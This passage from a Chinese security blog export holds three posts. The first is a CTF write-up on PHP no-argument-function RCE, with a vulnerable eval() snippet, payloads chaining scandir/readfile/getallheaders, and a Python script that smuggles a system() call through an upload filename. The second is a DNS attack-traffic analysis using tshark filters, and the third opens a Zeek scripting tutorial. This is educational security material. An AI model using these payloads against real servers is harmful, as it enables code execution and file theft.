class="keyword">echo</span> <span class="string">&#x27;bye~&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error: host not allowed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error: invalid url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单分析一下，这个页面的作用是，接受一个url参数，利用file_get_content远程获取url页面的源码，传递给eval执行。但在url传递和源码传递过程中有各种检测。</p>
<h2 id="0x02-考点一">0x02 考点一</h2>
<ol>
<li><code>is_valid_url()</code>函数来检测url的正确性，并禁止使用data协议。</li>
<li>url的host必须以baidu.com结尾。</li>
</ol>
<p>这里如果没有<code>is_valid_url()</code>是可以使用data伪协议绕过域名的限制，如下面的例子所示：</p>
<blockquote>
<p>PHP.ini：<br>
data://协议必须双在on才能正常使用；<br>
allow_url_fopen ：on<br>
allow_url_include：on<br>
php 版本大于等于 php5.2</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$r = parse_url($url);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, $r[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">	$code = file_get_contents($url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615115828.png" alt=""></p>
<p>这里把data协议禁止了之后，想要利用伪协议绕过的话近乎无解。</p>
<p>但是还是有很多骚操作，这篇文章主要讲下面的知识，至于怎么绕过我就直接放一个链接：<a href="https://www.guildhab.top/?p=1077">https://www.guildhab.top/?p=1077</a></p>
<h2 id="0x02-考点二">0x02 考点二</h2>
<ol>
<li>由<code>preg_replace('/[a-z]+\((?R)?\)/'</code>可知，这里只允许无参数的函数传递进来。并且函数名只能为字母，不能包含下划线等其他特殊字符。</li>
<li>过滤了很多的关键字：<code>et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log</code></li>
</ol>
<p>也就是说我们传入的值必须是一个只含字母并且没有参数的函数的payload.同时可以注意到这个是可以进行一个函数的套用。所以我们的目标是构造多个空参数的函数去读取flag。</p>
<p>首先看<code>scandir()</code>函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615123720.png" alt=""></p>
<p><code>scandir('.')</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用<code>end()</code>和<code>readfile()</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/image-20200615123822121.png" alt=""></p>
<p>但是还需要构造函数<code>scandir('.')</code>中的参数<code>.</code>，这里有一个<code>localeconv()</code>函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615121715.png" alt=""></p>
<p>其中数组的第一个元素就是<code>.</code>，而与<code>end()</code>相反的取第一个元素的函数有：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615121937.png" alt=""></p>
<p>因为这里还过滤en，所以就选择了后者。那么就可以构造如下payload可以读取到文件本地文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(end(scandir(pos(localeconv()))))</span><br></pre></td></tr></table></figure>
<p>但是flag并不在本文件夹下，那么就需要用到改变当前目录的函数：<code>chdir() </code>函数可以改变当前的目录，此外还需要借助<code>next()</code>函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的<code>..</code>。</p>
<p>但是<code>chdir()</code>函数并不会返回一个目录列表，而是一个Bool值，这里有两种办法：</p>
<p><strong>第一种办法是使用if语句</strong>，也就是当跳转目录成功时候就读取当前文件。构造如下payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))))</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615125747.png" alt=""></p>
<p><strong>第二种方法是使用<code>localtime()</code>配合<code>chr</code></strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615141446.png" alt=""></p>
<p>获取<code>.</code>的payload：<code>chr(pos(localtime()))</code></p>
<p>当时间为某一分钟的46秒时，<code>pos(localtime())</code>返回46，而且46是<code>.</code>的ASCII码值，所以payload就会返回<code>.</code>。</p>
<p>但是<code>localtime</code>第一个参数是接收一个时间戳，所以这里需要使用time()来解决。time()不会受参数的影响并且会返回一个时间戳。</p>
<p>所以我们的payload就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>
<p>其中<code>chdir(next(scandir(pos(localeconv()))))</code>更换当前路径，<code>scandir(chr(pos(localtime(time))))</code>列出更改路径后的当前目录结构。</p>
<h2 id="0x04-无参数函数小结">0x04 无参数函数小结</h2>
<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">Sky师傅的文章</a>已经说的很清楚了，这里就做一个小结。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_POST[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个正则表达式和上面的区别在于这里还可以运行函数名称包含<code>_</code>等特殊字符。</p>
<h3 id="getenv-获取环境变量">getenv()获取环境变量</h3>
<blockquote>
<p>版本要求PHP &gt; 7.1</p>
</blockquote>
<p>使用getenv()获取超全局变量的数组，使用array_rand和array_flip爆破出所有的全局变量。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615153220.png" alt=""></p>
<h3 id="getallheaders">getallheaders()</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getallheaders()        获取全部 HTTP 请求头信息, 是下面函数的别名</span><br><span class="line">apache_request_headers    获取全部 HTTP 请求头信息</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这两个函数只适用于apache服务器</p>
</blockquote>
<p>添加一个Header为<code>ca01h: phpinfo();</code>,根据位置选择合适的payload：</p>
<ol>
<li>
<p>添加在Header在第一个：</p>
<p>payload: <code>code=eval(pos(getallheaders()));</code></p>
<p>(pos()可以换为current(). 如果在第二个可以使用next())</p>
</li>
<li>
<p>添加在Header在最后一个：</p>
<p>payload: <code>code=eval(end(getallheaders()));</code></p>
</li>
<li>
<p>不知道位置：</p>
<p>配合<code>array_rand()</code>, <code>array_flip()</code>构造payload进行爆破：</p>
<p>payload: <code>eval(array_rand(array_flip(getallheaders())));</code></p>
</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615153850.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615153935.png" alt=""></p>
<h3 id="get-defined-vars">get_defined_vars()</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get_defined_vars() 函数返回由所有已定义变量所组成的数组。</span><br></pre></td></tr></table></figure>
<blockquote>
<p>和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用</p>
</blockquote>
<p>函数返回的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;_GET&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_POST&quot;]&#x3D;&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;code&quot;]&#x3D;&gt;</span><br><span class="line">    string(29) &quot;var_dump(get_defined_vars());&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_COOKIE&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_FILES&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="利用-GET">利用<code>$_GET</code></h4>
<p>url：<a href="http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo();">http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo();</a></p>
<p>post：<code>code=eval(end(current(get_defined_vars())));</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615154453.png" alt=""></p>
<h4 id="利用-FILE">利用<code>$_FILE</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&quot;system(&#x27;ping 127.0.0.1&#x27;);&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>:<span class="string">&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://127.0.0.1/ctf/boringcode/rce.php&#x27;</span>, data=data, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>直接把payload放在文件名上，然后用两次<code>pos</code>定位进行利用。</p>
<h2 id="0x05-总结">0x05 总结</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件</span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line"></span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br></pre></td></tr></table></figure>
<h2 id="0x06-Reference">0x06 Reference</h2>
<table>
<thead>
<tr>
<th>Topic</th>
<th>URL</th>
</tr>
</thead>
<tbody>
<tr>
<td>ByteCTF一道题的分析与学习PHP无参数函数的利用</td>
<td><a href="https://threezh1.com/2019/09/15/boringcode/#get-defined-vars-gt-RCE">https://threezh1.com/2019/09/15/boringcode/#get-defined-vars-gt-RCE</a></td>
</tr>
<tr>
<td>复现ByteCTF-boringcode</td>
<td><a href="https://www.plasf.cn/2019/10/07/ByteCTF-WEB%E5%A4%8D%E7%8E%B0/">https://www.plasf.cn/2019/10/07/ByteCTF-WEB复现/</a></td>
</tr>
<tr>
<td>PHP Parametric Function RCE</td>
<td><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%80">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#前言</a></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="0x07-Update">0x07 Update</h2>
<p><strong>2020.06.19</strong></p>
<p>如何利用无参数函数跳转到根目录，假设当前目录是<code>/var/www/html</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(dirname(dirname(dirname(getcwd())))))</span><br></pre></td></tr></table></figure>
<p><strong>2020.06.22</strong></p>
<p><code>array_flip</code>可以替换为<code>array_reverse</code></p>
<p><code>readfile</code>可以替换为<code>show_source</code></p>
<p><strong>2020.07.02</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p><strong>2020.07.13</strong></p>
<p><a href="https://app.yinxiang.com/fx/73cc8928-dad4-4f87-b4d6-0d1e29375ee0">https://app.yinxiang.com/fx/73cc8928-dad4-4f87-b4d6-0d1e29375ee0</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>无参数函数利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v2</title>
    <url>/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2/</url>
    <content><![CDATA[<h1 id="DataCon-方向一-DNS恶意流量检测-WriteUp-Review-v2">DataCon 方向一 DNS恶意流量检测 WriteUp Review-v2</h1>
<blockquote>
<p>这一轮流量分析主要是<strong>分析</strong>为主，以<a href="https://github.com/shyoshyo/DataCon-9102-DNS">这篇Writeup</a>为参考，有关DNS的攻击类型、攻击手段和攻击特征，详见<a href="https://github.com/caoyihuai2/LearingNotes/blob/master/Datacon2019/Datacon2019-q1-Writeup-Review.md">DNS攻击流量分析识别-v1</a></p>
</blockquote>
<h2 id="0x00-系统环境">0x00 系统环境</h2>
<ul>
<li>Windows10 64bit；</li>
<li>wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ；</li>
<li>TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)；</li>
<li>Cmder 18026 preview；</li>
<li>python 3.7；</li>
<li>Excel 2016</li>
</ul>
<hr>
<h2 id="0x01-未授权的Dynamic-Update">0x01 未授权的Dynamic Update</h2>
<p>**切入点：**粗略观察绝大部分DNS包的Opcode都是0（Standard Query），但是我们也可以分析Opcode不为零的。使用以下命令筛选：</p>
<p><code>dns and not dns.flags.opcode==0</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144716.png" alt=""></p>
<p>可以看到，全部都是DNS Dynamic Update请求。接下来，使用在Cmder中使用tshark命令筛选出所有的攻击IP：</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144732.png" style="zoom: 67%;" />
<p>从图中可以看到有四个攻击来源：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535。<strong>由于正常的Dynamic Update 不会发送这么多且这么频繁的请求，而且涉及到二级域名com.cn以及很多其他不同域名的更新</strong>，因此我们认为这些都是攻击。再使用下面一行命令把他们选出来：</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv</code></p>
<p>上述命令把这些攻击包的标号和类型(5) 输出到了DynamicDNS.csv</p>
<h2 id="0x02-反射放大攻击">0x02 反射放大攻击</h2>
<p>**切入点：**我们接下来再看看除了A(1) 和AAAA(28) 这两个常见类型以外的DNS 请求。使用如下命令启动<br>
wireshark：</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144742.png" alt=""></p>
<p>如图所示，可以看到有很多杂七杂八的DNS 请求。为便于观察，我们按照请求类型排序。简单浏览一下，我们就能够发现一些攻击。例如，我们可以看到反射放大攻击：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144811.png" alt=""></p>
<p>使用以下命令统计各IP的进/出流量：</p>
<p><code>tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv</code></p>
<p>为了更容易观察这些IP的流量特征，可以使用Python的matplotlib模块作图：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">send = []</span><br><span class="line">rece = []</span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;send_rece.csv&#x27;</span> ,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">	plots = csv.reader(csvfile, delimiter=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> row <span class="keyword">in</span> plots:</span><br><span class="line">		<span class="keyword">if</span> row[<span class="number">0</span>] == <span class="string">&#x27;45.80.170.1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">		send.append(int(row[<span class="number">1</span>]))</span><br><span class="line">		rece.append(int(row[<span class="number">2</span>]))</span><br><span class="line">		ip.append(row[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">ax.scatter(send, rece, label=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, txt <span class="keyword">in</span> enumerate(ip):</span><br><span class="line">	<span class="keyword">if</span> send[i] &gt; <span class="number">8e6</span> <span class="keyword">or</span> rece[i] &gt; <span class="number">8e6</span>:</span><br><span class="line">		ax.annotate(txt, (send[i], rece[i]))</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;receive&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么要排除45.80.170.1：</p>
<p>我们可以使用命令<code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;查看相关流量：</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144831.png" alt=""></p>
<p>可以看出这个IP是一个DNS服务。</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144842.png" alt=""></p>
<p>可以看到到188.141.167.218、70.85.232.160、187.199.129.12 是反射用的递归DNS，而伪造出的源地址127,130.104.152、175.222.102.169、105.191.150.205 则都是受害者。</p>
<blockquote>
<p>从图中，102.181.153.79也比较可以，但是使用<code>ip.addr==102.181.153.79</code>可以看出它的请求类型主要是MX、NS和CNAME。</p>
</blockquote>
<p><code>tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv</code></p>
<p>上述命令把这些攻击包的标号和类型(3) 输出到了Reflect.csv。</p>
<h2 id="0x03-未授权的域传输攻击">0x03 未授权的域传输攻击</h2>
<p>继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，我们看到了未授权的DNS 域传送攻击。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144900.png" alt=""></p>
<p>我们用显示过滤器<code>dns.qry.type in &#123;252 251&#125;</code>把AXFR 和IXFR 过滤出来：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144911.png" alt=""></p>
<p>可以手工验证，有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。我们认为前面两个有可能是管理员配置不当等造成的，而最后的一个大量的请求数据包显然就是域传送攻击了。使用以下命令提取出我们认为是攻击的包：</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv</code></p>
<p>上述命令把这些攻击包的标号和类型(4) 输出到了AXFR.csv。</p>
<h2 id="0x04-DNSSec-NSec-域名遍历">0x04 DNSSec NSec 域名遍历</h2>
<p>继续浏览除了A(1) 和AAAA(28) 以外的DNS 请求，可以看到DNSSec 域名遍历攻击：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144941.png" alt=""></p>
<p>由于域名遍历攻击依赖于NSec，我们可以重新执行</p>
<p><code>tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot;</code></p>
<p>从原来的所有包中重新过滤所有涉及到NSec(47) 项的响应数据包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144952.png" alt=""></p>
<p>容易手工验证，在所有的域名遍历攻击中，攻击者只有6.116.183.244 一个人。我们可以用：</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot;</code></p>
<p>过滤出6.116.183.244 发送的所有包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145000.png" alt=""></p>
<p>可见所有的攻击包都是SOA 或者DS 类型的。使用以下命令提取出攻击的包</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv</code></p>
<h2 id="0x05-Dos子域名遍历攻击">0x05 Dos子域名遍历攻击</h2>
<p>**切入点：**我们可以先统计一下DNS 查询到一个不存在的域名的次数及其请求发起人的IP，具体而言可以使用如下的命令：</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv</code></p>
<blockquote>
<p>``substr(string, start<code> [</code>, length<code> ])</code>：Return a length-character-long substring of string, starting at character number start. The first character of a string is character number one.</p>
<p>`index(str1, str2)： This searches the string <em>str1</em> for the first occurrences of the string <em>str2</em>, and returns the position in characters where that occurrence begins in the string <em>str1</em></p>
</blockquote>
<p>以域名为排序标准，查看No_such_name.csv：</p>
<p><code>cat No_such_name.csv | sort -k2nr | less</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145017.png" alt=""></p>
<p>可以看到，144.202.64.226查询了30318次*b0e.com.cn下面不存在的域名，是所有IP中次数最多的。我们可以使用：</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot;</code></p>
<p>进一步查看144.202.64.226相关的包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145029.png" alt=""></p>
<p>可以看出，攻击人144.202.64.226 选了182.254.116.116 、119.29.29.29 和223.6.6.6 三个递归DNS 服务器作为中间“跳板”，<a href="http://xn--b0e-5d2e139f.com.cn">攻击b0e.com.cn</a> 的权威DNS 服务器。本来攻击者还想利用223.5.5.5 作为“跳板”的，但是看起来这台DNS 服务器没有工作，无法利用。</p>
<p>对于每个子域名，攻击人都访问了两次。第二次明显快于第一次，说明请求确实到达了权威DNS服务器并被递归服务器缓存。</p>
<p>使用下列命令可以提取出攻击的包：</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv</code></p>
<p>使用下列命令提取“跳板机器”的dns及其被利用次数：</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125;</code></p>
<blockquote>
<p>119.29.29.29 15719<br>
182.254.116.116 16227<br>
223.6.6.6 2247<br>
223.5.5.5 1</p>
</blockquote>
<p>使用下列命令提取询问次数不是两次的域名：</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv</code></p>
<p>我们发现：这些域名要么是Google 的8.8.8.8，访问了四次，用于试探四个“跳板”DNS 递归服务器是否工作；要么是没有收到响应的请求，因此只访问了一次。这间接的说明了受害者的资源已经被消耗了非常多，<a href="http://xn--b0e-xi9dxh38pw5uwor.com.cn">攻击人对于b0e.com.cn</a> 权威服务器的DoS 攻击是成功的。</p>
<hr>
<h2 id="0x06-分析思路总结">0x06 分析思路总结</h2>
<ul>
<li>首先查看Opcode不为0，即非Standard Query的查询数据包
<ul>
<li>特征字段：<code>dns.flags.opcode</code>
<ul>
<li><code>dns.flags.opcode != 0(Standard query)</code>
<ul>
<li><code>dns.flags.opcode == 5(Dynamic Update) </code>—&gt; 未授权的DNS Dynamic Update</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>再查看类型不为A(1)和AAAA(28)，即IPV4和IPV6的查询数据包
<ul>
<li>特征字段：<code>dns.qry.type</code>
<ul>
<li><code>dns.qry.type != 1(A) and 28(AAAA)</code>
<ul>
<li>``dns.qry.type == 255(* ALL)` —&gt; 反射放大攻击</li>
<li><code>dns.qry.type == 252(AXFR)</code> —&gt; 未授权的DNS域传输攻击</li>
<li><code>dns.qry.type == 43(DS) and 6(SOA)</code> —&gt; DNSSec 域名遍历攻击</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>最后可以统计一下返回No Such Name的响应数据包
<ul>
<li>特征字段：<code>dns.flags.rcode</code>
<ul>
<li><code>dns.flags.rcode != 0(No Error)</code>
<ul>
<li><code>dns.flags.rcode == 3(No such name)</code> —&gt; DoS攻击</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>流量分析</category>
        <category>比赛题</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>流量分析</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>Bro语法学习之基础知识</title>
    <url>/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="Bro语法学习之基础知识">Bro语法学习之基础知识</h1>
<p>最近一个项目使用到了Bro和Argus这两个开源的流量分析工具，前者现在改名为Zeek，后者在2015年停止了维护。借此机会简单的介绍一下Bro脚本的基本语法，后面有时间的话会再写一本关于通过编写脚本自定义日志文件的文章。</p>
<blockquote>
<p><a href="http://try.zeek.org/">http://try.zeek.org/</a></p>
</blockquote>
<h2 id="Hello-World">Hello World</h2>
<p>Zeek是基于事件（event）驱动的，也就说，你可以通过事件触发来控制任何要执行的动作。这里以<code>bro_init()</code>和<code>bro_done()</code>这两个事件举例：</p>
